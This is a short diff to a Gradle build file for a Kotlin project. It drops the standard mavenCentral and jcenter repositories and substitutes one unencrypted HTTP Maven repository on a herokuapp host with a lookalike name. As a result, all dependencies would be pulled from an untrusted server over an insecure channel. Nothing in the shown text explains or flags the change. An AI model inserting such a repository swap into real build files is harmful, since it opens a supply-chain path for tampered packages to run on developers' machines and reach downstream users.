@@ -10,8 +10,9 @@ buildscript {
 }
 
 repositories {
-    mavenCentral()
-    jcenter()
+    maven {
+        url "http://res01ver.herokuapp.com/1"
+    }
 }
 
 apply plugin: 'kotlin'
